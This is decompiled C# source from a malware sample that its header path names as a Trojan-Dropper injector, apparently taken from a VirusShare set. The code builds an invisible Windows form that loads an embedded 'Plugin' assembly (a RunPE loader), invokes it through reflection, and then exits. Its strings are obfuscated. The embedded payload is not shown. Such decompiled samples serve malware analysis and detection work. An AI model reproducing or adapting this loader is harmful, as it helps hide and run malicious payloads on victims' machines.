// Decompiled with JetBrains decompiler
// Type: Services.Form1
// Assembly: Services, Version=1.0.0.0, Culture=neutral
// MVID: 67BBD34F-18EC-4D8E-8BB2-93E1440303B9
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Injector.ebgb-c787e854291e644165233504f6a1e34c1c712e2fc501c28ef76b0fa41f3f5df2.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Services
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("CheckBox1")]
    private CheckBox _CheckBox1;
    private Assembly RunPEAss;
    private object[] Params;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.RunPEAss = Assembly.Load(Services.My.Resources.Resources.Plugin);
      this.Params = new object[0];
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
label_2:
      int num = 3;
      Point point1;
      Size size1;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.Button1.Text = \u003CCliSecureRT\u003E.cs("\u008C\u009B\f:,'\u007F");
            this.Button1.UseVisualStyleBackColor = true;
            this.CheckBox1.AutoSize = true;
            CheckBox checkBox1_1 = this.CheckBox1;
            point1 = new Point(94, 69);
            Point point2 = point1;
            checkBox1_1.Location = point2;
            this.CheckBox1.Name = \u003CCliSecureRT\u003E.cs("\u008D\u0086\u001D-(\v!+1");
            CheckBox checkBox1_2 = this.CheckBox1;
            size1 = new Size(81, 17);
            Size size2 = size1;
            checkBox1_2.Size = size2;
            this.CheckBox1.TabIndex = 1;
            num = 2;
            continue;
          case 1:
            goto label_7;
          case 2:
            this.CheckBox1.Text = \u003CCliSecureRT\u003E.cs("\u008D\u0086\u001D-(\v!+1");
            this.CheckBox1.UseVisualStyleBackColor = true;
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            this.AutoScaleMode = AutoScaleMode.Font;
            size1 = new Size(187, 98);
            this.ClientSize = size1;
            this.Controls.Add((Control) this.CheckBox1);
            this.Controls.Add((Control) this.Button1);
            num = 1;
            continue;
          case 3:
            do
            {
              this.Button1 = new Button();
              this.CheckBox1 = new CheckBox();
              this.SuspendLayout();
              Button button1_1 = this.Button1;
              point1 = new Point(13, 13);
              Point point3 = point1;
              button1_1.Location = point3;
              this.Button1.Name = \u003CCliSecureRT\u003E.cs("\u008C\u009B\f:,'\u007F");
              Button button1_2 = this.Button1;
              size1 = new Size(75, 23);
              Size size3 = size1;
              button1_2.Size = size3;
              this.Button1.TabIndex = 0;
            }
            while (false);
            num = 0;
            continue;
          default:
            goto label_2;
        }
      }
label_7:
      this.Name = \u003CCliSecureRT\u003E.cs("\u0088\u0081\n#r");
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
label_2:
        int num = 3;
        EventHandler eventHandler;
        while (true)
        {
          switch (num)
          {
            case 0:
              if (this._Button1 != null)
              {
                num = 2;
                continue;
              }
              goto label_8;
            case 1:
              goto label_8;
            case 2:
              this._Button1.Click -= eventHandler;
              num = 1;
              continue;
            case 3:
              do
              {
                eventHandler = new EventHandler(this.Button1_Click);
              }
              while (false);
              num = 0;
              continue;
            default:
              goto label_2;
          }
        }
label_8:
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual CheckBox CheckBox1
    {
      get => this._CheckBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox1 = value;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
label_2:
      int num1 = 3;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 2;
            continue;
          case 1:
            goto label_9;
          case 2:
            int num2 = (int) Interaction.MsgBox((object) \u003CCliSecureRT\u003E.cs("\u00B9\u008B\u001F>6\u001B&\u0011X\u0097ÌÇ'¨wF®âî¡5M\u009E¯4ùV\u0001-\u001A\u00B9\u0088¶ =c·\v Ý'õ\u0090ní]LÍû^3è\u001E\u009F\u0085Òµè\u00BDåS®\u009Fé}¡õpú\u009Cbõ^}Ô\u008A,òbW&&ÀLv]ÃJ6Å\"\u0013\u0018ã,(Ë*~\u0081>hDùTÜ\u0001\u001Bu\u0098¤28\u0019/\u0003\u0017S\u008FÖÞ*\u0080{h¶ùÍ\u0096\u001C"));
            int num3 = (int) Interaction.MsgBox((object) \u003CCliSecureRT\u003E.cs("£¶\b\n\u0011\u001E!6e»ÿÛ\u0006\u00B2\u007Fg\u0087þÉ¡.{±\u00884Þb\u0002\n$º\u0088\u00BD57s\u008E\u0013!ä\vî§zå`oüéF\ré+\u0094§Í¿Ô\u00BEÖ\u007F\u0091¨äD¬Ç~Ö\u009DTðdEÉ\u008A\u0012ór~0;ÕBihþd5Î\u001B2;Ø\u001D%ê\u0011V\u0090\u001ALNËTÀ\t%t \u009D\u0017<4;'+X«üã\u001Aµ~K\u0083Ñ×\u008B-e \u00B2\bÎU*\u000F-\u00AD\u0089\u0097\u000E*e\u00BC8\u001DÜ+Ö\u00BEPå|bòûX1ö:\u0098\u009FÎ\u0086á\u008Aèq\u0084´äw\u00B9õKö\u009AlèK~Ó\u008C\u000EôAT\u001F\u0011îMqtÑR/È# \u0010ù1\u0005Ò\vg¬\u0004iCÿtÿ!#R\u00BC\u0099\v\u0005./9%C¸ÀÅ=\u0098lZ\u008AÐè¶+\\\u00B2"));
            num1 = 1;
            continue;
          case 3:
            while (true)
            {
              Thread.Sleep(50);
              this.RunPEAss.GetType(\u003CCliSecureRT\u003E.cs("\u008D\u0082\u0019=0\u0005'1r»ÝÕOÏWA\u0083èìÖ")).InvokeMember(\u003CCliSecureRT\u003E.cs("\u0083\u008F\u0011 "), BindingFlags.InvokeMethod, (Binder) null, (object) null, this.Params);
              ProjectData.EndApp();
              if (true)
              {
                num1 = 0;
                goto label_1;
              }
            }
            goto case 0;
          default:
            goto label_2;
        }
      }
label_9:
      if (false)
        return;
      \u003CCliSecureRT\u003E.cs("¤·04\u0001%:4w\u00B2ûÈ\b\u0087whªèï\u0081,Z\u0091\u008C\u001AÂm\u0002<\u001F¸\u0093\u0085#\0`»$-Â\v");
      \u003CCliSecureRT\u003E.cs("¡¦\"\t\u0017/&\u001Fi\u0090Þâ9®gL¡éçª\u001Efµµ\u0015ýM\a\u0019>\u0089¶\u0087=4}°\0 Ã2÷\u0087~ÃI\\ÃãF(õ!\u0087´Ø\u0095é\u00BDçQº\u00ADïx");
      \u003CCliSecureRT\u003E.cs("¨\u0086\u0015\f9\u00048'a·ÊÅ\t°nc¸íØ¬(E¬\u00AD\u0013æl*)\u001C\u0081\u0085\u0093\v6x\u0097\u00113ã\fù\u009F[ßMbÐÛ`");
    }

    private void Button1_Click(object sender, EventArgs e)
    {
    }
  }
}
